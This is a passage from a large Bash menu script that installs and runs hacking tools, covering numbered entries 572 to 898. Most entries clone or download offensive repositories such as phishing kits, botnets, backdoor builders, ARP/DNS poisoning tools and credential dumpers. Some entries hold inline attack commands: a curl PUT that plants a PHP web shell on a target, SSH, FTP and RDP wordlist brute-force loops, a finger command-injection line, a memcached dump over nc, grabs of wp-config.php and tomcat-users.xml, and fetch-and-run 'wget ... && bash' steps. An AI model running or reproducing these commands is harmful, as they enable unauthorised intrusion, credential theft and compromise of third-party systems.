	;;
	"572")
		Scarica "$ENTRAW""1N3/ReverseAPK/master/reverse-apk"
		Scarica "$ENTRAW""1N3/ReverseAPK/master/install"
	;;
	"573")
		Clona "robre/scripthunter"
	;;
	"574")
		Clona "epinna/weevely3"
	;;
	"575")
		Clona "MS-WEB-BN/c41n"
	;;
	"576")
		Clona "Veil-Framework/Veil"
	;;
	"577")
		Clona "KuroLabs/stegcloak"
	;;
	"578")
		Scarica "$ENTRAW""CiscoCXSecurity/creddump7/master/cachedump.py"
		Scarica "$ENTRAW""CiscoCXSecurity/creddump7/master/lsadump.py"
		Scarica "$ENTRAW""CiscoCXSecurity/creddump7/master/pwdump.py"
	;;
	"579")
		Scarica "$ENTRAW""AnonymousAt3/cybermap/main/cybermap.sh"
		Scarica "$ENTRAW""AnonymousAt3/cybermap/main/ip-list.txt"
	;;
	"580")
		Clona "JPaulMora/Pyrit"
	;;
	"581")
		Clona "EnableSecurity/wafw00f"
	;;
	"582")
		Clona "byt3bl33d3r/arpspoof"
	;;
	"583")
		Scarica "$ENTRAW""ammarx/ARP-spoofing/master/src/mmattack.py"
	;;
	"584")
		Scarica "$ENTRAW""BusesCanFly/rpi-hunter/master/rpi-hunter.py"
	;;
	"585")
		Clona "thewhiteh4t/FinalRecon"
	;;
	"586")
		Clona "saeeddhqan/evine"
	;;
	"587")
		Clona "PaperMtn/lil-pwny"
	;;
	"588")
		Clona "AzizKpln/Moriarty-Project"
	;;
	"589")
		Clona "mxrch/GHunt"
	;;
	"590")
		Clona "1tayH/noisy"
	;;
	"591")
		Clona "hash3liZer/WiFiBroot"
	;;
	"592")
		Clona "SValkanov/wifivoid"
	;;
	"593")
		Clona "TryCatchHCF/PacketWhisper"
	;;
	"594")
		Clona "r3vn/badKarma"
	;;
	"595")
		Clona "7Elements/Fortigate"
	;;
	"596")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a remote IP target without protocol"
			read -p "(example, 192.168.0.12): " TIP
		fi
		echo "Digit a folder shared in smb or samba from remote IP target"
		read -e -p "(example, backups): " FLD
		if [[ "$FLD" != "" ]];
		then
			echo "Digit an username or username%password of remote IP target"
			read -p "(example, admin or admin%password1234): " CREDS
			if [[ "$CREDS" != "" ]];
			then
				smbget -R "smb://""$TIP""/""$FLD" -U "$CREDS"
			fi
		fi
	;;
	"597")
		Clona "googleprojectzero/fuzzilli"
	;;
	"598")
		echo "Digit a remote URL or IP target with protocol"
		read -p "(example, http://site.web or http://192.168.0.12): " TURL
		if [[ "$TURL" != "" ]];
		then
			for FILE in "conf/tomcat-users.xml" "wp-includes/certificates/ca-bundle.crt" "robots.txt" ".htaccess" "condig.php" "sitemap.xml" "phpinfo.php" "wp-config.php"; do wget "$TURL""/""$FILE"; done
		fi
	;;
	"599")
		Clona "utkusen/urlhunter"
	;;
	"600")
		echo "Digit a remote URL or IP target with protocol"
		read -p "(example, http://site.web or http://192.168.0.12): " TURL
		if [[ "$TURL" != "" ]];
		then
			echo "Digit a cool shell name without extension to avoid blocks"
			read -e -p "(example, wsh3ll): " SHL
			if [[ "$SHL" != "" ]];
			then
				if [[ "$ANON" == "Enabled" ]];
				then
					curl -s -k -L --socks5 "$SANON" -v -X PUT -d '<?php system($_GET["cmd"]);?>' "$TURL""/""$SHL"".php"

				else
					curl -s -k -L -v -X PUT -d '<?php system($_GET["cmd"]);?>' "$TURL""/""$SHL"".php"
				fi
			fi
		fi
	;;
	"601")
		Clona "UnaPibaGeek/ctfr"
	;;
	"602")
		Clona "nil0x42/phpsploit"
	;;
	"603")
		Clona "Paradoxis/StegCracker"
	;;
	"604")
		Clona "qsecure-labs/overlord"
	;;
	"605")
		Clona "shadowlabscc/Kaiten"
	;;
	"606")
		Clona "Chudry/Xerror"
	;;
	"607")
		Clona "thewhiteh4t/seeker"
	;;
	"608")
		Clona "jackrendor/cookiedoor"
	;;
	"609")
		Scarica "$ENTRAW""pentestmonkey/finger-user-enum/master/finger-user-enum.pl"
	;;
	"610")
		Clona "audibleblink/doxycannon"
	;;
	"611")
		Clona "jmk-foofus/medusa"
	;;
	"612")
		Clona "openwall/john"
	;;
	"613")
		Scarica "$ENTRAW""bdblackhat/admin-panel-finder/master/admin_panel_finder.py"
		Scarica "$ENTRAW""bdblackhat/admin-panel-finder/master/link.txt"
	;;
	"614")
		Scarica "$ENTRAW""dariusztytko/jwt-key-id-injector/master/injector.py"
	;;
	"615")
		pkg update && pkg upgrade -y && pkg install curl wget tsu wget git && wget --no-check-certificate "$ENTRAW""Hax4us/Metasploit_termux/master/metasploit.sh" -O metasploit.sh && bash metasploit.sh
	;;
	"616")
		Clona "rajkumardusad/Tool-X"
	;;
	"617")
		echo "Digit an exploit file name without extension"
		read -p "(example, 460): " EXPL
		if [[ "$EXPL" != "" ]];
		then
			Scarica "https://www.exploit-db.com/download/""$EXPL"
		fi
	;;
	"618")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a remote IP"
			read -p "(example, 192.168.1.12): " TIP
		fi
		echo "Digit a wordlist usernames file path"
		read -e -p "(example, /usr/share/wordlist/users.txt): " USRF
		if [[ "$USRF" != "" ]];
		then
			if [[ -f "$USRF" ]];
			then
				for USERN in $(cat "$USRF"); do finger -l "$USRF""@""$TIP"; done
			fi
		fi
	;;
	"619")
		Clona "cddmp/enum4linux-ng"
	;;
	"620")
		Clona "hahwul/XSpear"
	;;
	"621")
		Clona "s0md3v/Arjun"
	;;
	"622")
		wget --no-check-certificate "$ENTRAW""1Tech-X/Auxilus.github.io/master/metasploit.sh" -O metasploit.sh && bash metasploit.sh
	;;
	"623")
		Clona "r0oth3x49/Xpath"
	;;
	"624")
		wget --no-check-certificate "$ENTLAB""st42/termux-sudo/-/raw/master/sudo" -O /data/data/com.termux/files/usr/bin/sudo
		chmod 700 /data/data/com.termux/files/usr/bin/sudo
	;;
	"625")
		Scarica "$ENTRAW""TermuxHacking000/phonia/main/phonia.sh"
		Scarica "$ENTSSL""TermuxHacking000/phonia/raw/main/phonia.zip"
	;;
	"626")
		Clona "GoVanguard/legion"
	;;
	"627")
		Clona "w-digital-scanner/w13scan"
	;;
	"628")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit target IP or URL"
			read -p "(example 192.168.168.12 or http://something.dark): " TIP
		fi
		if [[ "$TUSRN" == "" ]];
		then
			echo "Digit target username"
			read -p "(example, john): " TUSRN
		fi
		if [[ "$TDOM" == "" ]];
		then
			echo "Digit target domain"
			read -p "(example, john-pc): " TDOM
		fi
		if [[ -f "$WORDLIST" ]];
		then
			echo "Digit a wordlist password file path"
			read -e -p "(example, /usr/share/wordlist/rockyou.txt): " WORDLIST
		fi
		echo "Digit a LOCAL PORT for port forwarding (optional)"
		read -p "(example, 8080) default 22: " -i "22" LPRT
		if [[ "$LPRT" == "" ]];
		then
			LPRT="22"
		fi
		echo "Digit a REMOTE PORT for port forwarding (optional)"
		read -p "(example, 80) default 22: " -i "22" TPRT
		if [[ "$TPRT" == "" ]];
		then
			TPRT="22"
		fi
		for PASS in $(cat "$WORDLIST"); do sshpass -p "$PASS" ssh -L "$LPRT"":""$TIP"":""$TPRT" "$TUSRN""@""$TDOM"; done
	;;
	"629")
		Clona "voipmonitor/sniffer"
	;;
	"630")
		Clona "beurtschipper/Depix"
	;;
	"631")
		Clona "Anon-Exploiter/SiteBroker"
	;;
	"632")
		Clona "x90skysn3k/brutespray"
	;;
	"633")
		Scarica "$ENTRAW""TermuxHacking000/distrux/main/distrux.sh"
	;;
	"634")
		Clona "TermuxHacking000/SysO-Termux"
	;;
	"635")
		Scarica "$ENTRAW""TermuxHacking000/PortmapSploit/master/PortmapSploit.sh"
		Scarica "$ENTRAW""TermuxHacking000/PortmapSploit/master/Colors.sh"
	;;
	"636")
		Clona "xFreed0m/RDPassSpray"
	;;
	"637")
		Clona "Viralmaniar/Remote-Desktop-Caching-"
	;;
	"638")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a target IP"
			read -p "(example, 192.168.168.125): " TIP
		fi
		echo 'stats items' | nc "$TIP" 11211 | grep -oe ':[0-9]*:' | grep -oe '[0-9]*' | sort | uniq | xargs -L1 -I{} bash -c 'echo "stats cachedump {} 1000" | nc localhost 11211'
	;;
	"639")
		Clona "RUB-NDS/PRET"
	;;
	"640")
		Scarica "$ENTRAW""KALILINUXTRICKSYT/easysploit/master/easysploit"
		Scarica "$ENTRAW""KALILINUXTRICKSYT/easysploit/master/installer.sh"
	;;
	"641")
		Clona "m4ll0k/Konan"
	;;
	"642")
		Scarica "$ENTRAW""th3unkn0n/facebash-termux/master/facebash.sh"
		Scarica "$ENTRAW""th3unkn0n/facebash-termux/master/install.sh"
	;;
	"643")
		if [[ "$TDOM" == "" ]];
		then
			echo "Digit a remote domain target"
			read -p "(example, example.com): " TDOM
		fi
		echo "Select an output form"
		echo -ne "0. standard\n1. range\n2. hex\n3. octal\n4. binary\n5. CIDR\n"
		read -p "(example, 1): " OPT
		if [[ "$OPT" != "" ]];
		then
			case "$OPT" in
			"0")
				netmask -s "$TDOM"
			;;
			"1")
				netmask -r "$TDOM"
			;;
			"2")
				netmask -x "$TDOM"
			;;
			"3")
				netmask -o "$TDOM"
			;;
			"4")
				netmask -b "$TDOM"
			;;
			"5")
				netmask -c "$TDOM"
			;;
			esac
		fi
	;;
	"644")
		Clona "Pr0x13/iDict"
	;;
	"645")
		Clona "foozzi/iCloudBrutter"
	;;
	"646")
		Clona "nandydark/grim"
	;;
	"647")
		Clona "vchinnipilli/kubestrike"
	;;
	"648")
		Clona "cyberark/KubiScan"
	;;
	"649")
		echo "Digit a tar.gz file full path to extract"
		ls | egrep '\.tar.gz$'
		read -e -p "(example, ./example.tar.gz): " FLTR
		if [[ -f "$FLTR" ]];
		then
			tar zxvf "$FLTR"
		fi
	;;
	"650")
		Clona "edoardottt/scilla"
	;;
	"651")
		Clona "leebaird/discover"
	;;
	"652")
		if [[ "$TURL" == "http://0.0.0.0" ]];
		then
			echo "Digit an IP target with protocol to get docker version"
			read -p "(example, http://19.20.21.22): " TURL
		fi
		echo "Digit the Docker port target"
		read -p "(default, 2376): " -i "2376" TTDP
		TDP=2376
		if [[ "$TTDP" != "" ]];
		then
			if [[ "$TTDP" =~ ^[0-9]+$ ]];
			then
				TDP="$TTDP"
			fi
		fi
		if [[ "$ANON" == "Enabled" ]];
		then
			curl -s -k -L --socks5 "$SANON" "$TURL"":""$TDP""/version" | python -m json.tool
		else
			curl -s -k -L "$TURL"":""$TDP""/version" | python -m json.tool
		fi
	;;
	"653")
		Clona "adnane-X-tebbaa/GRecon"
	;;
	"654")
		Scarica "$ENTRAW""Rover141/Shellter/master/shellter"
	;;
	"655")
		Scarica "$ENTRAW""Moham3dRiahi/WPGrabInfo/master/WP-Grab.pl"
	;;
	"656")
		Clona "spicesouls/reosploit"
	;;
	"657")
		Clona "sa7mon/S3Scanner"
	;;
	"658")
		Clona "SimplySecurity/SimplyEmail"
	;;
	"659")
		Clona "aljazceru/s3-bucket-scanner"
	;;
	"660")
		Clona "ankane/s3tk"
	;;
	"661")
		Scarica "$ENTRAW""bear/s3scan/master/s3scan.py"
	;;
	"662")
		Clona "haroonawanofficial/Amazon-AWS-Hack"
	;;
	"663")
		Clona "nagwww/101-AWS-S3-Hacks"
	;;
	"664")
		Clona "aquasecurity/cloudsploit"
	;;
	"665")
		Scarica "$ENTRAW""jos666/itunes_hack/master/itunes.py"
	;;
	"666")
		Clona "yuejd/ios_Restriction_PassCode_Crack---Python-version"
	;;
	"667")
		Scarica "$ENTRAW""ShayanDeveloper/WordPress-Hacker/master/WordPress%20Hacker.py"
	;;
	"668")
		Scarica "$ENTRAW""Jamalc0m/wphunter/master/wphunter.php"
	;;
	"669")
		echo "Digit an executable file name to analyze"
		read -e -p "(example, ./sysinfo): " EXF
		if [[ -f "$EXF" ]];
		then
			echo "Digit a report file name"
			read -p "(example, sysinfo): " RPF
			if [[ "$RPF" != "" ]];
			then
				strace -f -i -o "$RPF"".strace" "$EXF"
				ltrace -f -i -o "$RPF"".ltrace" "$EXF"
			fi
		fi
	;;
	"670")
		Clona "doyensec/ajpfuzzer"
	;;
	"671")
		Clona "localh0t/backfuzz"
	;;
	"672")
		Clona "RootUp/BFuzz"
	;;
	"673")
		Clona "CENSUS/choronzon"
	;;
	"674")
		Clona "dobin/ffw"
	;;
	"675")
		Clona "hadoocn/conscan"
	;;
	"676")
		Clona "rudSarkar/crlf-injector"
	;;
	"677")
		Clona "MozillaSecurity/dharma"
	;;
	"678")
		Clona "ernw/dizzy"
	;;
	"679")
		Clona "googleprojectzero/domato"
	;;
	"680")
		Clona "wireghoul/doona"
	;;
	"681")
		Clona "zznop/flyr"
	;;
	"682")
		Clona "nccgroup/FrisbeeLite"
	;;
	"683")
		Clona "k0retux/fuddly"
	;;
	"684")
		Clona "nol13/fuzzball"
	;;
	"685")
		Scarica "$ENTRAW""OblivionDev/fuzzdiff/master/fuzzdiff"
	;;
	"686")
		Clona "nccgroup/fuzzowski"
	;;
	"687")
		Clona "renatahodovan/grammarinator"
	;;
	"688")
		Scarica "$ENTRAW""lobuhi/byp4xx/main/byp4xx.sh"
	;;
	"689")
		Clona "savio-code/hexorbase"
	;;
	"690")
		Clona "nccgroup/Hodor"
	;;
	"691")
		Clona "google/honggfuzz"
	;;
	"692")
		Clona "tehmoon/http-fuzzer"
	;;
	"693")
		Clona "andresriancho/websocket-fuzzer"
	;;
	"694")
		Clona "twilsonb/jbrofuzz"
	;;
	"695")
		Clona "cisco-sas/kitty"
	;;
	"696")
		Clona "mxmssh/manul"
	;;
	"697")
		Clona "IOActive/Melkor_ELF_Fuzzer"
	;;
	"698")
		Clona "mazzoo/ohrwurm"
	;;
	"699")
		Clona "MozillaSecurity/peach"
	;;
	"700")
		Clona "calebstewart/peach"
	;;
	"701")
		Clona "marcinguy/powerfuzzer"
	;;
	"702")
		Clona "HSASec/ProFuzz"
	;;
	"703")
		Clona "hgascon/pulsar"
	;;
	"704")
		Clona "mseclab/PyJFuzz"
	;;
	"705")
		ClonaLab "akihe/radamsa"
	;;
	"706")
		Scarica "$ENTRAW""pbnj/s3-fuzzer/master/main.go"
	;;
	"707")
		Clona "Battelle/sandsifter"
	;;
	"708")
		Clona "mfontanini/sloth-fuzzer"
	;;
	"709")
		Scarica "$ENTRAW""nopper/archpwn/master/repo/fuzzer/smtp-fuzz/smtp-fuzz.pl"
	;;
	"710")
		Scarica "$ENTRAW""LukasRypl/snmp-fuzzer/master/snmp-fuzzer.py"
		Scarica "$ENTSSL""LukasRypl/snmp-fuzzer/raw/master/exportedSNMPv1Trap"
	;;
	"711")
		Scarica "$ENTRAW""landw1re/socketfuzz/master/socketfuzz.py"
	;;
	"712")
		Clona "allfro/sploitego"
	;;
	"713")
		Scarica "$ENTRAW""GDSSecurity/SQLBrute/master/sqlbrute.py"
	;;
	"714")
		Scarica "$ENTRAW""wireghoul/sploit-dev/master/sshfuzz.pl"
	;;
	"715")
		Clona "rsmusllp/termineter"
	;;
	"716")
		Clona "droberson/thefuzz"
	;;
	"717")
		Clona "kernelslacker/trinity"
	;;
	"718")
		Clona "PAGalaxyLab/uniFuzzer"
	;;
	"719")
		Scarica "$ENTRAW""nullsecuritynet/tools/master/fuzzer/tftp-fuzz/release/tftp-fuzz.py"
	;;
	"720")
		Scarica "$ENTRAW""nullsecuritynet/tools/master/fuzzer/uniofuzz/source/uniofuzz.py"
	;;
	"721")
		Clona "andresriancho/w3af"
	;;
	"722")
		Clona "OWASP/OWASP-WebScarab"
	;;
	"723")
		Clona "wereallfeds/webshag"
	;;
	"724")
		Clona "samhocevar/zzuf"
	;;
	"725")
		Clona "alpkeskin/mosint"
	;;
	"726")
		Clona "SpiderLabs/ikeforce"
	;;
	"727")
		Clona "royhills/ike-scan"
	;;
	"728")
		Clona "droope/ldap-brute"
	;;
	"729")
		Clona "chris408/ct-exposer"
	;;
	"730")
		Clona "gotr00t0day/IGF"
	;;
	"731")
		Clona "gotr00t0day/forbiddenpass"
	;;
	"732")
		Clona "gotr00t0day/spyhunt"
	;;
	"733")
		Clona "gotr00t0day/spider00t"
	;;
	"734")
		Clona "gotr00t0day/subdomainbrute"
	;;
	"735")
		Clona "gotr00t0day/oswalkpy"
	;;
	"736")
		Scarica "$ENTRAW""gotr00t0day/VulnBanner/master/vulnbanner.py"
		Scarica "$ENTRAW""gotr00t0day/VulnBanner/master/vulnbanners.txt"
	;;
	"737")
		Scarica "$ENTRAW""gotr00t0day/b1n4ryR3v3rs3/master/binaryreverse.sh"
	;;
	"738")
		Scarica "$ENTRAW""gotr00t0day/SSHbrute/master/sshbrute.py"
	;;
	"739")
		echo "Digit the OS name"
		uname -a
		read -p "(example, stretch): " DSTR
		if [[ "$DSTR" != "" ]];
		then
			echo "deb https://deb.torproject.org/torproject.org $DSTR main" >> /etc/apt/sources.list
			echo "deb-src https://deb.torproject.org/torproject.org $DSTR main" >> /etc/apt/sources.list
			curl https://deb.torproject.org/torproject.org/A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.asc | gpg --import
			gpg --export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | apt-key add -
			apt update
			apt install tor deb.torproject.org-keyring
		fi
	;;
	"740")
		echo "Digit the OS name"
		uname -a
		read -p "(example, stretch): " DSTR
		if [[ "$DSTR" != "" ]];
		then
			apt install apt-transport-tor
			echo "deb tor://sdscoq7snqtznauu.onion/torproject.org $DSTR main" >> /etc/apt/sources.list
			apt update
			apt install tor
		fi
	;;
	"741")
		Clona "PaytmLabs/nerve"
	;;
	"742")
		Clona "rajkumardusad/onex"
	;;
	"743")
		Clona "deivid-rodriguez/pry-byebug"
	;;
	"744")
		if [[ "$TDOM" == "" ]];
		then
			echo "Digit a domain with top domain"
			read -p "(example, google.com): " TDOM
		fi
		dig +short mx "$TDOM"
	;;
	"745")
		if [[ "$TDOM" == "" ]];
		then
			echo "Digit a domain with top domain"
			read -p "(example, google.com): " TDOM
		fi
		for CMD in "a" "txt" "ns" "mx"; do host -t "$CMD" "$TDOM"; done
	;;
	"746")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a target IP"
			read -p "(example, 10.11.12.13): " TIP
		fi
			for CMD in "readlist" "readvar" "monlist" "peers" "listpeers" "associations" "sysinfo"; do ntpq -c "$CMD" "$TIP"; done
	;;
	"747")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a target IP"
			read -p "(example, 10.11.12.13): " TIP
		fi
			nmblookup -A "$TIP"
	;;
	"748")
		Clona "SafeBreach-Labs/SirepRAT"
	;;
	"749")
		if [[ "$IP" == "" ]];
		then
			echo "Digit a target IP"
			read -p "(example, 10.11.12.13): " TIP
		fi
		wget -m --no-passive ftp://anonymous:anonymous@$TIP
	;;
	"750")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a target IP"
			read -p "(example, 10.11.12.13): " TIP
		fi
		echo "Digit a password wordlist file full path"
		read -e -p "(example, /usr/share/wordlists/passwords.txt): " PWRD
		if [[ -f "$PWRD" ]];
		then
			echo "Digit a username wordlist file full path"
			read -e -p "(example, /usr/share/wordlists/usernames.txt): " UWRD
			if [[ -f "$UWRD" ]];
			then
				for PSSW in $(cat "$PWRD");
				do
					for USRN in $(cat "$UWRD");
					do
						wget -m --no-passive "ftp://$USRN:$PSSW@$TIP"
					done
				done
			fi
		fi
	;;
	"751")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a target IP or domain"
			read -p "(example, 10.11.12.13 or domain.com): " TIP
		fi
		echo "Digit a command to execute"
		read -p "(example, /bin/id): " CMD
		if [[ "$CMD" != "" ]];
		then
			finger "|$CMD@$TIP"
		fi
	;;
	"752")
		Clona "theMiddleBlue/DNSenum"
	;;
	"753")
		Clona "rbsec/dnscan"
	;;
	"754")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a target IP or domain"
			read -p "(example, 10.11.12.13 or domain.com): " TIP
		fi
		rpcinfo -p "$TIP"
	;;
	"755")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a target IP or domain"
			read -p "(example, 10.11.12.13 or domain.com): " TIP
		fi
		rpcclient -U "" "$TIP"
	;;
	"756")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a target IP or domain"
			read -p "(example, 10.11.12.13 or domain.com): " TIP
		fi
		smbclient -L //$TIP -N
	;;
	"757")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a target IP or domain"
			read -p "(example, 10.11.12.13 or domain.com): " TIP
		fi
		for USR in $(cat "$UWRD");
		do
			rlogin -l "$USR" $TIP
		done
	;;
	"758")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a target IP"
			read -p "(example, 10.11.12.13): " TIP
		fi
		if [[ "$TDOM" == "" ]];
		then
		echo "Digit a domain"
		read -p "(example, MY-PC): " TDOM
		fi
		echo "Digit USERNAME wordlist full path"
		read -e -p "(example, /usr/share/wordlists/usernames.txt): " UWRD
		if [[ -f "$UWRD" ]];
		then
			echo "Digit PASSWORD wordlist full path"
			read -e -p "(example, /usr/share/wordlists/passwords.txt): " PWRD
			if [[ -f "$PWRD" ]];
			then
				for PSS in $(cat "$PWRD");
				do
					for USR in $(cat "$UWRD");
					do
						rdesktop -d "$TDOM" -u "$USR" -p "$PSS" "$TIP"
					done
				done
			fi
		fi
	;;
	"759")
		Scarica "$ENTRAW""Avinash-acid/Redis-Server-Exploit/master/redis.py"
	;;
	"760")
		Clona "fnk0c/cangibrina"
	;;
	"761")
		Clona "toniblyx/prowler"
	;;
	"762")
		Clona "f0cker/crackq"
	;;
	"763")
		Scarica "$ENTRAW""hashcrackq/Crackq/master/crackqcli.py"
	;;
	"764")
		Clona "Esser420/EvilTwinFramework"
	;;
	"765")
		Clona "infobyte/evilgrade"
	;;
	"766")
		Clona "helich0pper/Karkinos"
	;;
	"767")
		Clona "htr-tech/zphisher"
	;;
	"768")
		Clona "capt-meelo/LazyRecon"
	;;
	"769")
		Scarica "$ENTRAW""nahamsec/lazyrecon/master/lazyrecon.sh"
	;;
	"770")
		Clona "jaeles-project/jaeles"
	;;
	"771")
		Clona "xxhax-team/vk-phishing"
	;;
	"772")
		Clona "eslam3kl/3klCon"
	;;
	"773")
		Clona "UBoat-Botnet/UBoat"
	;;
	"774")
		Clona "nccgroup/dirble"
	;;
	"775")
		Clona "aaaguirrep/offensive-docker"
	;;
	"776")
		ScaricaIn "$ENTSSL""cSploit/android/releases/download/v1.6.6-rc.2/cSploit-release.apk" "cSploit-release.apk"
	;;
	"777")
		ScaricaIn "$ENTSSL""routerkeygen/routerkeygenAndroid/releases/download/v4.0.2/routerkeygen-4-0-2.apk" "routerkeygen-4-0-2.apk"
	;;
	"778")
		Clona "ethicalhackingplayground/SubNuke"
	;;
	"779")
		Clona "ethicalhackingplayground/dorkX"
	;;
	"780")
		Clona "capture0x/XSS-LOADER"
	;;
	"781")
		Clona "E4rr0r4/XGDork"
	;;
	"782")
		ScaricaIn "$ENTSSL""intercepter-ng/mirror/raw/master/Intercepter-NG.2.0.apk" "Intercepter-NG.2.0.apk"
	;;
	"783")
		Clona "gr3yc4t/dns-poisoning-tool"
	;;
	"784")
		Clona "SemyonMakhaev/dns-poison"
	;;
	"785")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""ShanjinurIslam/Computer-Security-DNS-Cache-Poisoning/master/main.py"
		fi
	;;
	"786")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "dracipn/arp-cache-poisoning"
		fi
	;;
	"787")
		Clona "EONRaider/Arp-Spoofer"
	;;
	"788")
		Clona "EmreOvunc/ARP-Poisoning-Tool"
	;;
	"789")
		Clona "CoolerVoid/0d1n"
	;;
	"790")
		Clona "hahwul/a2sv"
	;;
	"791")
		Clona "MITRECND/abcd"
	;;
	"792")
		Clona "LandGrey/abuse-ssl-bypass-waf"
	;;
	"793")
		Clona "fox-it/aclpwn.py"
	;;
	"795")
		Clona "sahakkhotsanyan/adfind"
	;;
	"796")
		Clona "sshock/AFFLIBv3"
	;;
	"797")
		Clona "CoreSecurity/Agafi"
	;;
	"798")
		Clona "tintinweb/aggroArgs"
	;;
	"799")
		Clona "blark/aiodnsbrute"
	;;
	"800")
		Clona "v1s1t0r1sh3r3/airgeddon"
	;;
	"801")
		Clona "Josue87/Airopy"
	;;
	"802")
		Clona "lanjelot/albatar"
	;;
	"803")
		Clona "infosec-au/altdns"
	;;
	"804")
		Clona "EgeBalci/Amber"
	;;
	"805")
		Clona "bdcht/amoco"
	;;
	"806")
		Clona "dkovar/analyzeMFT"
	;;
	"807")
		Clona "AndroBugs/AndroBugs_Framework"
	;;
	"808")
		Clona "androguard/androguard"
	;;
	"809")
		Clona "Flo354/Androick"
	;;
	"810")
		Clona "bbqlinux/android-udev-rules"
	;;
	"811")
		Clona "PentesterES/AndroidPINCrack"
	;;
	"812")
		Clona "maaaaz/androwarn"
	;;
	"813")
		Clona "salls/angrop"
	;;
	"814")
		Clona "lewangbtcc/anti-XSS"
	;;
	"815")
		Clona "Acey9/Chimay-Red"
	;;
	"816")
		Clona "rednaga/APKiD"
	;;
	"817")
		Clona "hexabin/APKStat"
	;;
	"818")
		Clona "dpnishant/appmon"
	;;
	"819")
		Clona "MooseDojo/apt2"
	;;
	"820")
		Clona "michenriksen/aquatone"
	;;
	"821")
		Clona "pirate/ArchiveBox"
	;;
	"822")
		Clona "arduino/Arduino"
	;;
	"823")
		Clona "P-H-C/phc-winner-argon2"
	;;
	"824")
		Clona "tokyoneon/Armor"
	;;
	"825")
		Clona "alexpark07/ARMSCGen"
	;;
	"826")
		Clona "he2ss/arpstraw"
	;;
	"827")
		Clona "Lab-Zjt/ARPTools"
	;;
	"828")
		Clona "ntrippar/ARPwner"
	;;
	"829")
		Clona "mthbernardes/ARTLAS"
	;;
	"830")
		Clona "quarkslab/arybo"
	;;
	"831")
		Clona "tomnomnom/assetfinder"
	;;
	"832")
		Clona "flipkart-incubator/astra"
	;;
	"833")
		Clona "NORMA-Inc/AtEar"
	;;
	"834")
		Clona "m4ll0k/Atlas"
	;;
	"835")
		Clona "AlisamTechnology/ATSCAN-V3.1"
	;;
	"836")
		Clona "superhedgy/AttackSurfaceMapper"
	;;
	"837")
		Clona "aemkei/aurebesh.js"
	;;
	"838")
		Clona "Tylous/Auto_EAP"
	;;
	"839")
		Clona "MRGEffitas/scripts"
	;;
	"840")
		Clona "skahwah/automato"
	;;
	"841")
		Clona "redteamsecurity/AutoNessus"
	;;
	"842")
		Clona "m4ll0k/AutoNSE"
	;;
	"843")
		Clona "nccgroup/autopwn"
	;;
	"844")
		Clona "Tib3rius/AutoRecon"
	;;
	"845")
		Clona "bharshbarger/AutOSINT"
	;;
	"846")
		Clona "NullArray/AutoSploit"
	;;
	"847")
		Clona "adtac/autovpn"
	;;
	"848")
		Scarica "$ENTSSL""icsharpcode/AvaloniaILSpy/releases/download/v5.0-rc2/ILSpy-linux-x64-Release.zip"
	;;
	"849")
		Clona "microsoft/avml"
	;;
	"850")
		Clona "VirtueSecurity/aws-extender-cli"
	;;
	"851")
		Clona "nccgroup/aws-inventory"
	;;
	"852")
		Clona "jordanpotti/AWSBucketDump"
	;;
	"853")
		Clona "chokepoint/azazel"
	;;
	"854")
		Clona "aliasrobotics/aztarna"
	;;
	"855")
		Clona "mrjopino/backcookie"
	;;
	"856")
		Clona "dana-at-cp/backdoor-apk"
	;;
	"857")
		Clona "secretsquirrel/the-backdoor-factory"
	;;
	"858")
		Clona "Kkevsterrr/backdoorme"
	;;
	"859")
		Clona "r00txp10it/backdoorppt"
	;;
	"860")
		Clona "l0gan/backHack"
	;;
	"861")
		Clona "giuliocomi/backoori"
	;;
	"862")
		Clona "deepzec/Bad-Pdf"
	;;
	"863")
		Clona "ThunderGunExpress/BADministration"
	;;
	"864")
		Clona "ChiChou/bagbak"
	;;
	"865")
		Clona "bwall/BAMF"
	;;
	"866")
		Clona "programa-stic/barf-project"
	;;
	"867")
		Clona "NickstaDB/BaRMIe"
	;;
	"868")
		Clona "Voulnet/barq"
	;;
	"869")
		Clona "Bashfuscator/Bashfuscator"
	;;
	"870")
		Clona "neohapsis/bbqsql"
	;;
	"871")
		Clona "lijiejie/bbscan"
	;;
	"872")
		Clona "secretsquirrel/BDFProxy"
	;;
	"873")
		Clona "invictus1306/beebug"
	;;
	"874")
		Clona "honeynet/beeswarm"
	;;
	"875")
		Clona "aancw/Belati"
	;;
	"876")
		Clona "chokepoint/Beleth"
	;;
	"877")
		Clona "bettercap/bettercap"
	;;
	"878")
		Clona "bettercap/ui"
	;;
	"879")
		Clona "mazen160/bfac"
	;;
	"880")
		Clona "tmbinc/bgrep"
	;;
	"881")
		Clona "GitHackTools/BillCipher"
	;;
	"882")
		Clona "Vector35/binaryninja-python"
	;;
	"883")
		Clona "elfmaster/binflow"
	;;
	"884")
		Clona "Hood3dRob1n/BinGoo"
	;;
	"885")
		Clona "nccgroup/BinProxy"
	;;
	"886")
		Clona "ReFirmLabs/binwalk"
	;;
	"887")
		Clona "bmaia/binwally"
	;;
	"888")
		Clona "sensepost/birp"
	;;
	"889")
		Clona "nbshelton/bitdump"
	;;
	"890")
		Clona "sepehrdaddev/blackbox"
	;;
	"891")
		Clona "thelinuxchoice/blackeye"
	;;
	"892")
		Clona "jedisct1/blacknurse"
	;;
	"893")
		Clona "evilsocket/bleah"
	;;
	"894")
		Clona "afrantzis/bless"
	;;
	"895")
		Clona "libeclipse/blind-sql-bitshifting"
	;;
	"896")
		Clona "missDronio/blindy"
	;;
	"897")
		Clona "BloodHoundAD/BloodHound"
	;;
	"898")
